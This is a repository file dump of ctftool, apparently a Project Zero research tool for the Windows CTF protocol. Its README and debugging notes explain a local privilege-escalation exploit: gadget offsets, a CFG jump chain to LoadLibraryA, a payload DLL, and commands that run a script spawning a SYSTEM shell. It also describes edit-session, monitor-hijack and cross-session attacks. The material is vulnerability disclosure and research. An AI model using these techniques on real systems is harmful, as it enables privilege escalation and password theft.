{
  "metadata": {
    "timestamp": 1736710194158,
    "page": 891,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjkwMA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "taviso/ctftool",
      "stars": 1647,
      "defaultBranch": "master",
      "files": [
        {
          "name": ".gitignore",
          "type": "blob",
          "size": 0.17578125,
          "content": "*.exe\r\n*.obj\r\n*.pdb\r\n*.lib\r\n*.ilk\r\n*.xml\r\n*.idb\r\n*.til\r\n*.nam\r\n*.id0\r\n*.id1\r\n*.id2\r\n*.dll\r\n*.res\r\n*.zip\r\n.*.sw?\r\n.swp\r\n*.ipdb\r\n*.iobj\r\n*.log\r\n*.tmp\r\narchive\r\n.vscode\r\n.ctfhistory\r\n"
        },
        {
          "name": ".gitmodules",
          "type": "blob",
          "size": 0.1826171875,
          "content": "[submodule \"pe-parse\"]\n\tpath = pe-parse\n\turl = https://github.com/trailofbits/pe-parse.git\n[submodule \"wineditline\"]\n\tpath = wineditline\n\turl = https://github.com/winlibs/wineditline.git\n"
        },
        {
          "name": ".zipignore",
          "type": "blob",
          "size": 0.2841796875,
          "content": "*/.git/*\r\n*/*/.git/*\r\n*/.vscode/*\r\n*/*.obj\r\n*/*.pdb\r\n*/*.lib\r\n*/*.ilk\r\n*/*.xml\r\n*/*.idb\r\n*/*.til\r\n*/*.nam\r\n*/*.id0\r\n*/*.id1\r\n*/*.id2\r\n*/*.res\r\n*/*.zip\r\n*/.*.sw?\r\n*/.swp\r\n*/*.ipdb\r\n*/*.iobj\r\n*/*.log\r\n*/archive/*\r\n*/.vscode\r\n*/.ctfhistory\r\n*/build-*.lib/*\r\n*/*.zip\r\n*/*.exe\r\n*/*.dll\r\n*/*.tmp\r\n"
        },
        {
          "name": "DEBUGGING.md",
          "type": "blob",
          "size": 2.9365234375,
          "content": "## Debugging\r\n\r\nHere is how I debug problems with the exploit.\r\n\r\n```$ cdb notepad.exe```\r\n\r\nDisable first chance AV and BPE exceptions, because there are a lot of them.\r\n\r\n```\r\n> sxd av\r\n> sxd bpe\r\n> g\r\n```\r\n\r\nThen do this in ctftool\r\n\r\n```\r\nctf> connect\r\nctf> wait notepad.exe\r\nctf> script scripts\\ctf-exploit-common-win10.ctf\r\n```\r\n\r\n### Things to check\r\n\r\n* Are the offsets still correct?\r\n```\r\n0:000> ? msvcrt!_init_time - msvcrt\r\nEvaluate expression: 204080 = 00000000`00031d30\r\n0:000> ? combase!CStdProxyBuffer_CF_AddRef - combase\r\nEvaluate expression: 2023984 = 00000000`001ee230\r\n0:000> ? KERNEL32!LoadLibraryAStub - kernel32\r\nEvaluate expression: 125792 = 00000000`0001eb60\r\n0:000> ? msctf!CCompartmentEventSink::`vftable' - msctf\r\nEvaluate expression: 991272 = 00000000`000f2028\r\n0:000> ? MSCTF!CCompartmentEventSink::OnChange - msctf \r\nEvaluate expression: 798752 = 00000000`000c3020\r\n0:000> dqs msctf!CCompartmentEventSink::`vftable' L4\r\n00007ffd`04312028  00007ffd`04243d00 MSCTF!CCompartmentEventSink::QueryInterface\r\n00007ffd`04312030  00007ffd`04262840 MSCTF!CCompartmentEventSink::AddRef\r\n00007ffd`04312038  00007ffd`0425c940 MSCTF!CCompartmentEventSink::Release\r\n00007ffd`04312040  00007ffd`042e3020 MSCTF!CCompartmentEventSink::OnChange\r\n0:000> dqs MSCTF!CStubIEnumTfInputProcessorProfiles::_StubTbl + 0n496*8 L\r\n00007ffd`1aee6440 MSCTF!CTipProxy::Reconvert\r\n```\r\n\r\n* Did the buffer get built correctly?\r\n\r\n```\r\n0:000> dqs kernel32 + a9008 L8\r\n00007ffd`03df9008  00007ffd`03df9008 KERNEL32!g_Upload16BitCriticalSection+0x128\r\n00007ffd`03df9010  00007ffd`042e3020 MSCTF!CCompartmentEventSink::OnChange\r\n00007ffd`03df9018  00000000`00000000\r\n00007ffd`03df9020  00000000`00000000\r\n00007ffd`03df9028  00000000`00000000\r\n00007ffd`03df9030  00000000`00000000\r\n00007ffd`03df9038  00007ffd`03d6eb60 KERNEL32!LoadLibraryAStub\r\n00007ffd`03df9040  00007ffd`03df9048 KERNEL32!g_Upload16BitCriticalSection+0x168\r\n0:000> da kernel32 + a9008 + 8*8\r\n00007ffd`03df9048  \"..\\TEMP\\EXPLOIT\"\r\n```\r\n\r\n* Are the gadgets different?\r\n\r\n```\r\n0:000> u MSCTF!CCompartmentEventSink::OnChange \r\nMSCTF!CCompartmentEventSink::OnChange:\r\n00007ffd`042e3020 488b4130        mov     rax,qword ptr [rcx+30h]\r\n00007ffd`042e3024 488b4938        mov     rcx,qword ptr [rcx+38h]\r\n00007ffd`042e3028 48ff25718a0300  jmp     qword ptr [MSCTF!_guard_dispatch_icall_fptr (00007ffd`0431baa0)]\r\n0:000> u combase!CStdProxyBuffer_CF_AddRef \r\ncombase!CStdProxyBuffer_CF_AddRef:\r\n00007ffd`02e1e230 488b49c8        mov     rcx,qword ptr [rcx-38h]\r\n00007ffd`02e1e234 488b01          mov     rax,qword ptr [rcx]\r\n00007ffd`02e1e237 488b4008        mov     rax,qword ptr [rax+8]\r\n00007ffd`02e1e23b 48ff254e5d0700  jmp     qword ptr [combase!__guard_dispatch_icall_fptr (00007ffd`02e93f90)]\r\n```\r\n\r\n* Did the CFG whitelist change?\r\n\r\n```C:\\> dumpbin /headers /loadconfig```\r\n\r\n* Is the payload DLL accessible?\r\n\r\n```C:\\> icacls %WINDIR%\\temp\\exploit.dll```\r\n\r\n* Is the payload DLL working?\r\n\r\n```C:\\> rundll32 %WINDIR%\\temp\\exploit.dll,test```\r\n"
        },
        {
          "name": "GNUmakefile",
          "type": "blob",
          "size": 2.44140625,
          "content": "CC=cl.exe\nRC=rc.exe\nMSBUILD=msbuild.exe\nCMAKE=cmake.exe\nRFLAGS=/nologo\nCFLAGS=/nologo /Zi /Od /MD /FS\nLFLAGS=/nologo /machine:x86\nVFLAGS=-no_logo\nMFLAGS=/p:Configuration=Release /nologo /m /v:q\nCXXFLAGS=/nologo /Zi /Od /EHsc /MD /FS\nLDLIBS=user32 ole32 edit advapi32 peparse shlwapi imm32 shell32\nLDFLAGS=/MD\nLINKFLAGS=/ignore:4099\nVSDEVCMD=cmd.exe /c vsdevcmd.bat\n\n# Commands for arch specific compiler.\nifeq ($(OS),Windows_NT)\n    CC64=$(VSDEVCMD) $(VFLAGS) -arch=amd64 ^& cl\n    CC32=$(VSDEVCMD) $(VFLAGS) -arch=x86 ^& cl\nelse\n    CC64=$(VSDEVCMD) $(VFLAGS) -arch=amd64 \"&\" cl\n    CC32=$(VSDEVCMD) $(VFLAGS) -arch=x86 \"&\" cl\nendif\n\n.PHONY: clean distclean\n\nall: ctftool.exe payload32.dll payload64.dll\n\nrelease: ctftool.zip ctftool-src.zip\n\n%.res: %.rc\n\t$(RC) $(RFLAGS) $<\n\n%.obj: %.cc\n\t$(CC) $(CXXFLAGS) /c /Fo:$@ $<\n\n%.obj: %.c\n\t$(CC) $(CFLAGS) /c /Fo:$@ $<\n\n%.exe: %.obj\n\t$(CC) $(CFLAGS) $(LDFLAGS) /Fe:$@ $^ /link $(LINKFLAGS) $(LDLIBS:=.lib)\n\n%.dll: %.obj\n\t$(CC) $(CFLAGS) $(LDFLAGS) /LD /Fe:$@ $^ /link $(LINKFLAGS)\n\n%64.obj: %.c\n\t$(CC) $(CFLAGS) /c /Fd:$(@:.obj=.pdb) /Fo:$@ $<\n\n%32.obj: %.c\n\t$(CC) $(CFLAGS) /c /Fd:$(@:.obj=.pdb) /Fo:$@ $<\n\n%64.dll: CC=$(CC64)\n%64.dll: %64.obj version.res\n\t$(CC) $(CFLAGS) $(LDFLAGS) /LD /Fd:$(@:.dll=.pdb) /Fe:$@ $^ /link $(LINKFLAGS)\n\n%32.dll: CC=$(CC32)\n%32.dll: %32.obj version.res\n\t$(CC) $(CFLAGS) $(LDFLAGS) /LD /Fd:$(@:.dll=.pdb) /Fe:$@ $^ /link $(LINKFLAGS)\n\npeparse.lib:\n\t$(CMAKE) -S pe-parse -B build-$@\n\t$(MSBUILD) $(MFLAGS) build-$@/pe-parse.sln\n\tcmd.exe /c copy build-$@\\\\pe-parser-library\\\\Release\\\\pe-parser-library.lib $@\n\nedit.lib:\n\t$(CMAKE) -S wineditline -B build-$@\n\t$(MSBUILD) $(MFLAGS) build-$@/WinEditLine.sln\n\tcmd.exe /c copy build-$@\\\\src\\\\Release\\\\edit_a.lib $@\n\nctftool.exe: command.obj ctftool.obj winmsg.obj marshal.obj     \\\n             util.obj module.obj version.res peproc.obj         \\\n             messages.obj winutil.obj                           \\\n                | edit.lib peparse.lib\n\nclean:\n\t-cmd.exe /c del /q /f *.exp *.exe *.obj *.pdb *.ilk *.xml *.res *.ipdb *.iobj *.dll *.tmp\n\t-cmd.exe /c rmdir /q /s $(wildcard build-*.*)\n\n# These are slow to rebuild and I dont change them often.\ndistclean: clean\n\t-cmd.exe /c del /q /f edit.lib peparse.lib\n\t-cmd.exe /c del /q /f ctftool.zip ctftool-src.zip\n\nctftool.zip: README.md ctftool.exe payload32.dll payload64.dll scripts docs\n\t(cd .. && zip -r ctftool/$@ $(patsubst %,ctftool/%,$^))\n\nctftool-src.zip:\n\t(cd .. && zip -x@ctftool/.zipignore -r ctftool/$@ ctftool)\n"
        },
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 11.0908203125,
          "content": "                                 Apache License\n                           Version 2.0, January 2004\n                        http://www.apache.org/licenses/\n\n   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION\n\n   1. Definitions.\n\n      \"License\" shall mean the terms and conditions for use, reproduction,\n      and distribution as defined by Sections 1 through 9 of this document.\n\n      \"Licensor\" shall mean the copyright owner or entity authorized by\n      the copyright owner that is granting the License.\n\n      \"Legal Entity\" shall mean the union of the acting entity and all\n      other entities that control, are controlled by, or are under common\n      control with that entity. For the purposes of this definition,\n      \"control\" means (i) the power, direct or indirect, to cause the\n      direction or management of such entity, whether by contract or\n      otherwise, or (ii) ownership of fifty percent (50%) or more of the\n      outstanding shares, or (iii) beneficial ownership of such entity.\n\n      \"You\" (or \"Your\") shall mean an individual or Legal Entity\n      exercising permissions granted by this License.\n\n      \"Source\" form shall mean the preferred form for making modifications,\n      including but not limited to software source code, documentation\n      source, and configuration files.\n\n      \"Object\" form shall mean any form resulting from mechanical\n      transformation or translation of a Source form, including but\n      not limited to compiled object code, generated documentation,\n      and conversions to other media types.\n\n      \"Work\" shall mean the work of authorship, whether in Source or\n      Object form, made available under the License, as indicated by a\n      copyright notice that is included in or attached to the work\n      (an example is provided in the Appendix below).\n\n      \"Derivative Works\" shall mean any work, whether in Source or Object\n      form, that is based on (or derived from) the Work and for which the\n      editorial revisions, annotations, elaborations, or other modifications\n      represent, as a whole, an original work of authorship. For the purposes\n      of this License, Derivative Works shall not include works that remain\n      separable from, or merely link (or bind by name) to the interfaces of,\n      the Work and Derivative Works thereof.\n\n      \"Contribution\" shall mean any work of authorship, including\n      the original version of the Work and any modifications or additions\n      to that Work or Derivative Works thereof, that is intentionally\n      submitted to Licensor for inclusion in the Work by the copyright owner\n      or by an individual or Legal Entity authorized to submit on behalf of\n      the copyright owner. For the purposes of this definition, \"submitted\"\n      means any form of electronic, verbal, or written communication sent\n      to the Licensor or its representatives, including but not limited to\n      communication on electronic mailing lists, source code control systems,\n      and issue tracking systems that are managed by, or on behalf of, the\n      Licensor for the purpose of discussing and improving the Work, but\n      excluding communication that is conspicuously marked or otherwise\n      designated in writing by the copyright owner as \"Not a Contribution.\"\n\n      \"Contributor\" shall mean Licensor and any individual or Legal Entity\n      on behalf of whom a Contribution has been received by Licensor and\n      subsequently incorporated within the Work.\n\n   2. Grant of Copyright License. Subject to the terms and conditions of\n      this License, each Contributor hereby grants to You a perpetual,\n      worldwide, non-exclusive, no-charge, royalty-free, irrevocable\n      copyright license to reproduce, prepare Derivative Works of,\n      publicly display, publicly perform, sublicense, and distribute the\n      Work and such Derivative Works in Source or Object form.\n\n   3. Grant of Patent License. Subject to the terms and conditions of\n      this License, each Contributor hereby grants to You a perpetual,\n      worldwide, non-exclusive, no-charge, royalty-free, irrevocable\n      (except as stated in this section) patent license to make, have made,\n      use, offer to sell, sell, import, and otherwise transfer the Work,\n      where such license applies only to those patent claims licensable\n      by such Contributor that are necessarily infringed by their\n      Contribution(s) alone or by combination of their Contribution(s)\n      with the Work to which such Contribution(s) was submitted. If You\n      institute patent litigation against any entity (including a\n      cross-claim or counterclaim in a lawsuit) alleging that the Work\n      or a Contribution incorporated within the Work constitutes direct\n      or contributory patent infringement, then any patent licenses\n      granted to You under this License for that Work shall terminate\n      as of the date such litigation is filed.\n\n   4. Redistribution. You may reproduce and distribute copies of the\n      Work or Derivative Works thereof in any medium, with or without\n      modifications, and in Source or Object form, provided that You\n      meet the following conditions:\n\n      (a) You must give any other recipients of the Work or\n          Derivative Works a copy of this License; and\n\n      (b) You must cause any modified files to carry prominent notices\n          stating that You changed the files; and\n\n      (c) You must retain, in the Source form of any Derivative Works\n          that You distribute, all copyright, patent, trademark, and\n          attribution notices from the Source form of the Work,\n          excluding those notices that do not pertain to any part of\n          the Derivative Works; and\n\n      (d) If the Work includes a \"NOTICE\" text file as part of its\n          distribution, then any Derivative Works that You distribute must\n          include a readable copy of the attribution notices contained\n          within such NOTICE file, excluding those notices that do not\n          pertain to any part of the Derivative Works, in at least one\n          of the following places: within a NOTICE text file distributed\n          as part of the Derivative Works; within the Source form or\n          documentation, if provided along with the Derivative Works; or,\n          within a display generated by the Derivative Works, if and\n          wherever such third-party notices normally appear. The contents\n          of the NOTICE file are for informational purposes only and\n          do not modify the License. You may add Your own attribution\n          notices within Derivative Works that You distribute, alongside\n          or as an addendum to the NOTICE text from the Work, provided\n          that such additional attribution notices cannot be construed\n          as modifying the License.\n\n      You may add Your own copyright statement to Your modifications and\n      may provide additional or different license terms and conditions\n      for use, reproduction, or distribution of Your modifications, or\n      for any such Derivative Works as a whole, provided Your use,\n      reproduction, and distribution of the Work otherwise complies with\n      the conditions stated in this License.\n\n   5. Submission of Contributions. Unless You explicitly state otherwise,\n      any Contribution intentionally submitted for inclusion in the Work\n      by You to the Licensor shall be under the terms and conditions of\n      this License, without any additional terms or conditions.\n      Notwithstanding the above, nothing herein shall supersede or modify\n      the terms of any separate license agreement you may have executed\n      with Licensor regarding such Contributions.\n\n   6. Trademarks. This License does not grant permission to use the trade\n      names, trademarks, service marks, or product names of the Licensor,\n      except as required for reasonable and customary use in describing the\n      origin of the Work and reproducing the content of the NOTICE file.\n\n   7. Disclaimer of Warranty. Unless required by applicable law or\n      agreed to in writing, Licensor provides the Work (and each\n      Contributor provides its Contributions) on an \"AS IS\" BASIS,\n      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or\n      implied, including, without limitation, any warranties or conditions\n      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A\n      PARTICULAR PURPOSE. You are solely responsible for determining the\n      appropriateness of using or redistributing the Work and assume any\n      risks associated with Your exercise of permissions under this License.\n\n   8. Limitation of Liability. In no event and under no legal theory,\n      whether in tort (including negligence), contract, or otherwise,\n      unless required by applicable law (such as deliberate and grossly\n      negligent acts) or agreed to in writing, shall any Contributor be\n      liable to You for damages, including any direct, indirect, special,\n      incidental, or consequential damages of any character arising as a\n      result of this License or out of the use or inability to use the\n      Work (including but not limited to damages for loss of goodwill,\n      work stoppage, computer failure or malfunction, or any and all\n      other commercial damages or losses), even if such Contributor\n      has been advised of the possibility of such damages.\n\n   9. Accepting Warranty or Additional Liability. While redistributing\n      the Work or Derivative Works thereof, You may choose to offer,\n      and charge a fee for, acceptance of support, warranty, indemnity,\n      or other liability obligations and/or rights consistent with this\n      License. However, in accepting such obligations, You may act only\n      on Your own behalf and on Your sole responsibility, not on behalf\n      of any other Contributor, and only if You agree to indemnify,\n      defend, and hold each Contributor harmless for any liability\n      incurred by, or claims asserted against, such Contributor by reason\n      of your accepting any such warranty or additional liability.\n\n   END OF TERMS AND CONDITIONS\n\n   APPENDIX: How to apply the Apache License to your work.\n\n      To apply the Apache License to your work, attach the following\n      boilerplate notice, with the fields enclosed by brackets \"[]\"\n      replaced with your own identifying information. (Don't include\n      the brackets!)  The text should be enclosed in the appropriate\n      comment syntax for the file format. We also recommend that a\n      file or class name and description of purpose be included on the\n      same \"printed page\" as the copyright notice for easier\n      identification within third-party archives.\n\n   Copyright [yyyy] [name of copyright owner]\n\n   Licensed under the Apache License, Version 2.0 (the \"License\");\n   you may not use this file except in compliance with the License.\n   You may obtain a copy of the License at\n\n       http://www.apache.org/licenses/LICENSE-2.0\n\n   Unless required by applicable law or agreed to in writing, software\n   distributed under the License is distributed on an \"AS IS\" BASIS,\n   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n   See the License for the specific language governing permissions and\n   limitations under the License.\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 15.3662109375,
          "content": "# CTFTOOL\r\n\r\n>\r\n> Just want to test the SYSTEM exploit? [Click here](#Exploit).\r\n>\r\n\r\n[![Video of Exploit](docs/thumb.png)](https://www.youtube.com/watch?v=r3vrzzDpmhc)\r\n\r\n## An Interactive CTF Exploration Tool\r\n\r\nThis is `ctftool`, an interactive command line tool to experiment with CTF, a\r\nlittle-known protocol used on Windows to implement Text Services. This might\r\nbe useful for studying Windows internals, debugging complex issues with Text\r\nInput Processors and analyzing Windows security.\r\n\r\nIt is possible to write simple scripts with `ctftool` for automating interaction\r\nwith CTF clients or servers, or perform simple fuzzing.\r\n\r\n## Background\r\n\r\nThere is a blog post that accompanies the release of this tool available here.\r\n\r\nhttps://googleprojectzero.blogspot.com/2019/08/down-rabbit-hole.html\r\n\r\n## Usage\r\n\r\n`ctftool` has been tested on Windows 7, Windows 8 and Windows 10. Both 32-bit\r\nand x64 versions are supported, but x64 has been tested more extensively.\r\n\r\nThere is online help for most commands, simply type `help` to see a list of\r\ncommands, and `help <command>` to see detailed help for a particular command.\r\n\r\n```\r\n$ ./ctftool.exe\r\nAn interactive ctf exploration tool by @taviso.\r\nType \"help\" for available commands.\r\nMost commands require a connection, see \"help connect\".\r\nctf> help\r\nType `help <command>` for help with a specific command.\r\nAny line beginning with # is considered a comment.\r\n\r\nhelp            - List available commands.\r\nexit            - Exit the shell.\r\nconnect         - Connect to CTF ALPC Port.\r\ninfo            - Query server informaiton.\r\nscan            - Enumerate connected clients.\r\ncallstub        - Ask a client to invoke a function.\r\ncreatestub      - Ask a client to instantiate CLSID.\r\nhijack          - Attempt to hijack an ALPC server path.\r\nsendinput       - Send keystrokes to thread.\r\nsetarg          - Marshal a parameter.\r\ngetarg          - Unmarshal a parameter.\r\nwait            - Wait for a process and set it as the default thread.\r\nthread          - Set the default thread.\r\nsleep           - Sleep for specified milliseconds.\r\nforget          - Forget all known stubs.\r\nstack           - Print the last leaked stack ptr.\r\nmarshal         - Send command with marshalled parameters.\r\nproxy           - Send command with proxy parameters.\r\ncall            - Send command without appended data.\r\nwindow          - Create and register a message window.\r\npatch           - Patch a marshalled parameter.\r\nmodule          - Print the base address of a module.\r\nmodule64        - Print the base address of a 64bit module.\r\neditarg         - Change the type of a marshalled parameter.\r\nsymbol          - Lookup a symbol offset from ImageBase.\r\nset             - Change or dump various ctftool parameters.\r\nshow            - Show the value of special variables you can use.\r\nlock            - Lock the workstation, switch to Winlogon desktop.\r\nrepeat          - Repeat a command multiple times.\r\nrun             - Run a command.\r\nscript          - Source a script file.\r\nprint           - Print a string.\r\nconsent         - Invoke the UAC consent dialog.\r\nreg             - Lookup a DWORD in the registry.\r\ngadget          - Find the offset of a pattern in a file.\r\nsection         - Lookup property of PE section.\r\nMost commands require a connection, see \"help connect\".\r\nctf>\r\n```\r\n\r\nThe first thing you will want to do is connect to a session, and see which\r\nclients are connected.\r\n\r\n```\r\nctf> connect\r\nThe ctf server port is located at \\BaseNamedObjects\\msctf.serverDefault1\r\nNtAlpcConnectPort(\"\\BaseNamedObjects\\msctf.serverDefault1\") => 0\r\nConnected to CTF server@\\BaseNamedObjects\\msctf.serverDefault1, Handle 00000264\r\nctf> scan\r\nClient 0, Tid 3400 (Flags 0x08, Hwnd 00000D48, Pid 8696, explorer.exe)\r\nClient 1, Tid 7692 (Flags 0x08, Hwnd 00001E0C, Pid 8696, explorer.exe)\r\nClient 2, Tid 9424 (Flags 0x0c, Hwnd 000024D0, Pid 9344, SearchUI.exe)\r\nClient 3, Tid 12068 (Flags 0x08, Hwnd 00002F24, Pid 12156, PROCEXP64.exe)\r\nClient 4, Tid 9740 (Flags 0000, Hwnd 0000260C, Pid 3840, ctfmon.exe)\r\n```\r\n\r\nYou can then experiment by sending and receiving commands to the server, or any\r\nof the connected clients.\r\n\r\n## Building\r\n\r\n> If you don't want to build it yourself, check out the [releases](https://github.com/taviso/ctftool/releases) tab\r\n\r\nI used [GNU make](http://gnuwin32.sourceforge.net/packages/make.htm) and Visual\r\nStudio 2019 to develop `ctftool`. Only 32-bit builds are supported, as this\r\nallows the tool to run on x86 and x64 Windows.\r\n\r\nIf all the dependencies are installed, just typing `make` in a developer command\r\nprompt should be enough.\r\n\r\nI use the \"Build Tools\" variant of Visual Studio, and the only components I have\r\nselected are MSVC, MSBuild, CMake and the SDK.\r\n\r\nThis project uses submodules for some of the dependencies, be sure that you're\r\nusing a command like this to fetch all the required code.\r\n\r\n```\r\ngit submodule update --init --recursive\r\n```\r\n\r\n## Exploit\r\n\r\n> The examples only work on Windows 10 x64. All platforms and versions since\r\n> Windows XP are affected, but no PoC is currently implemented.\r\n\r\nThis tool was used to discover many critical security problem with the CTF\r\nprotocol that have existed for decades.\r\n\r\nIf you just want to test an exploit on Windows 10 x64 1903, run or double-click\r\n`ctftool.exe` and enter this command:\r\n\r\n```\r\nAn interactive ctf exploration tool by @taviso.\r\nType \"help\" for available commands.\r\nMost commands require a connection, see \"help connect\".\r\nctf> script .\\scripts\\ctf-consent-system.ctf\r\n```\r\n\r\nThis will wait for the UAC dialog to appear, compromise it and start a shell.\r\n\r\nIn fact, the exploit code is split into two stages that you can use\r\nindependently. For example, you might want to compromise a process belonging to\r\na user on a different session using the optional parameters to `connect`.\r\n\r\nMost CTF clients can be compromised, as the kernel forces applications that draw\r\nwindows to load the vulnerable library.\r\n\r\nSimply connect to a session, select a client to compromise (use the `scan` and\r\n`thread` commands, or just `wait`), then:\r\n\r\n```\r\nctf> script .\\scripts\\ctf-exploit-common-win10.ctf\r\n```\r\n\r\n### Exploitation Notes\r\n\r\nBuilding a CFG jump chain that worked on the majority of CTF clients was quite\r\nchallenging. There are two primary components to the final exploit, an arbitrary\r\nwrite primitive and then setting up our registers to call `LoadLibrary()`.\r\n\r\n> You can use `dumpbin /headers /loadconfig` to dump the whitelisted branch\r\n> targets.\r\n\r\n#### Arbitrary Write\r\n\r\nI need an arbitrary write gadget to create objects in a predictable location.\r\nThe best usable gadget I was able to find was an arbitrary dword decrement in\r\n`msvcrt!_init_time`.\r\n\r\nThis means rather than just setting the values we want, We have to keep\r\ndecrementing until the LSB reaches the value we want. This is a lot of work,\r\nbut we never have to do more than `(2^8 - 1) * len` decrements.\r\n\r\n![Decrement Write](docs/decrement-arbitrary-value.gif)\r\n\r\nUsing this primitive, I build an object like this in some unused slack space\r\nin kernel32 `.data` section. It needs to be part of an image so that I can\r\npredict where it will be mapped, as image randomization is per-boot on Windows.\r\n\r\n![Object Layout](docs/fake-object-layout.png)\r\n\r\nThere were (of course) lots of arbitrary write gadgets, the problem was\r\nregaining control of execution *after* the write. This proved quite challenging,\r\nand that's the reason I was stuck with a dword decrement instead of something\r\nsimpler.\r\n\r\nMSCTF catches all exceptions, so the challenge was finding an arbitrary write\r\nthat didn't mess up the stack so that SEH survived, or crashed really quickly\r\nwithout doing any damage.\r\n\r\nThe `msvcrt!_init_time` gadget was the best I could find, within a few\r\ninstructions it dereferences NULL without corrupting any more memory. This means\r\nwe can repeat it ad infinitum.\r\n\r\n#### Redirecting Execution\r\n\r\nI found two useful gadgets for adjusting registers, The first was:\r\n\r\n```\r\ncombase!CStdProxyBuffer_CF_AddRef:\r\n      mov     rcx,qword ptr [rcx-38h]\r\n      mov     rax,qword ptr [rcx]    \r\n      mov     rax,qword ptr [rax+8]  \r\n      jmp     qword ptr [combase!__guard_dispatch_icall_fptr]\r\n```\r\n\r\nAnd the second was:\r\n\r\n```\r\nMSCTF!CCompartmentEventSink::OnChange:\r\n      mov     rax,qword ptr [rcx+30h]\r\n      mov     rcx,qword ptr [rcx+38h]\r\n      jmp     qword ptr [MSCTF!_guard_dispatch_icall_fptr]\r\n```\r\n\r\nBy combining these two gadgets with the object we formed with our write gadget,\r\nwe can redirect execution to `kernel32!LoadLibraryA` by bouncing between them.\r\n\r\nThis was complicated, but the jump sequence works like this:\r\n\r\n![Exploit Chain Sequence](docs/exploit-chain-sequence.png)\r\n\r\nIf you're interested, I recommend watching it in a debugger. Note that you will\r\nneed to use the command `sxd av` and `sxd bpe` or the debugger will stop for\r\nevery write!\r\n\r\n## Edit Session Attacks\r\n\r\nApart from memory corruption, a major vulnerability class exposed by CTF are\r\n*edit session attacks*. Normally, an unprivileged process (for example, low\r\nintegrity) would not be permitted to send input or read data from a high\r\nprivileged process. This security boundary is called UIPI, *User Interface\r\nPrivilege Isolation*.\r\n\r\nCTF breaks these assumptions, and allows unprivileged processes to send input\r\nto privileged processes.\r\n\r\nThere are some requirements for this attack to work, as far as I'm aware it\r\nwill only work if you have a display language installed that uses an OoP TIP,\r\n*out-of-process text input processor*. Users with input languages that use IMEs \r\n(Chinese, Japanese, Korean, and so on) and users with a11y tools fall into this\r\ncategory.\r\n\r\nExample attacks include...\r\n\r\n * Sending commands to an elevated command window.\r\n * Reading passwords out of dialogs or the login screen.\r\n * Escaping IL/AppContainer sandboxes by sending input to unsandboxed windows.\r\n\r\nThere is an example [script](scripts/ctf-demo-editsession.ctf) in the scripts\r\ndirectory that will send input to a notepad window to demonstrate how edit\r\nsessions work.\r\n\r\n[![Edit Session Screenshot](docs/edit-thumb.png)](docs/edit-session-full.png)\r\n\r\n## Monitor Hijacking\r\n\r\nBecause there is no authentication involved between clients and servers in the\r\nCTF protocol, an attacker with the necessary privileges to write to\r\n`\\BaseNamedObjects` can create the CTF ALPC port and pretend to be the monitor.\r\n\r\nThis allows any and all restrictions enforced by the monitor to be bypassed.\r\n\r\nIf you want to experiment with this attack, try the `hijack` command in `ctftool`.\r\n\r\n```\r\nAn interactive ctf exploration tool by @taviso.\r\nType \"help\" for available commands.\r\nctf> hijack Default 1\r\nNtAlpcCreatePort(\"\\BaseNamedObjects\\msctf.serverDefault1\") => 0 00000218\r\nNtAlpcSendWaitReceivePort(\"\\BaseNamedObjects\\msctf.serverDefault1\") => 0 00000218\r\n000000: 18 00 30 00 0a 20 00 00 00 11 00 00 44 11 00 00  ..0.. ......D...\r\n000010: a4 86 00 00 b7 66 b8 00 00 11 00 00 44 11 00 00  .....f......D...\r\n000020: e7 12 01 00 0c 00 00 00 80 01 02 00 20 10 d6 05  ............ ...\r\nA a message received\r\n        ProcessID: 4352, SearchUI.exe\r\n        ThreadId: 4420\r\n        WindowID: 00020180\r\nNtAlpcSendWaitReceivePort(\"\\BaseNamedObjects\\msctf.serverDefault1\") => 0 00000218\r\n000000: 18 00 30 00 0a 20 00 00 ac 0f 00 00 0c 03 00 00  ..0.. ..........\r\n000010: ec 79 00 00 fa 66 b8 00 ac 0f 00 00 0c 03 00 00  .y...f..........\r\n000020: 12 04 01 00 08 00 00 00 10 01 01 00 00 00 00 00  ................\r\nA a message received\r\n        ProcessID: 4012, explorer.exe\r\n        ThreadId: 780\r\n        WindowID: 00010110\r\nNtAlpcSendWaitReceivePort(\"\\BaseNamedObjects\\msctf.serverDefault1\") => 0 00000218\r\n000000: 18 00 30 00 0a 20 00 00 ac 0f 00 00 0c 03 00 00  ..0.. ..........\r\n000010: fc 8a 00 00 2a 67 b8 00 ac 0f 00 00 0c 03 00 00  ....*g..........\r\n000020: 12 04 01 00 08 00 00 00 10 01 01 00 58 00 00 00  ............X...\r\nA a message received\r\n        ProcessID: 4012, explorer.exe\r\n        ThreadId: 780\r\n...\r\n```\r\n\r\n## Cross Session Attacks\r\n\r\nThere is no session isolation in the CTF protocol, any process can connect to\r\nany CTF server. For example, a Terminal Services user can interact with the\r\nprocesses of any other user, even the Administrator.\r\n\r\nThe `connect` command in `ctftool` supports connecting to non-default sessions\r\nif you want to experiment with this attack.\r\n\r\n```\r\nAn interactive ctf exploration tool by @taviso.\r\nType \"help\" for available commands.\r\nMost commands require a connection, see \"help connect\".\r\nctf> help connect\r\nConnect to CTF ALPC Port.\r\n\r\nUsage: connect [DESKTOPNAME SESSIONID]\r\nWithout any parameters, connect to the ctf monitor for the current\r\ndesktop and session. All subsequent commands will use this connection\r\nfor communicating with the ctf monitor.\r\n\r\nIf a connection is already open, the existing connection is closed first.\r\n\r\nIf DESKTOPNAME and SESSIONID are specified, a connection to ctf monitor\r\nfor another desktop and session are opened, if it exists.\r\nIf the specified port does not exist, wait until it does exist. This is\r\nso that you can wait for a session that hasn't started\r\nyet in a script.\r\nExamples\r\n Connect to the monitor for current desktop\r\n  ctf> connect\r\n Connect to a specific desktop and session.\r\n  ctf> connect Default 1\r\nMost commands require a connection, see \"help connect\".\r\n```\r\n\r\n## Status\r\n\r\nAt the time of writing, it is unknown how Microsoft will change the CTF\r\nprotocol in response to the numerous design flaws this tool helped expose.\r\n\r\nFor that reason, consider this tool to be in proof-of-concept state.\r\n\r\n### Supported Versions and Platforms\r\n\r\nAll versions of Windows since Windows XP use CTF, on all supported platforms.\r\n\r\nWhile not part of the base system until XP, versions as 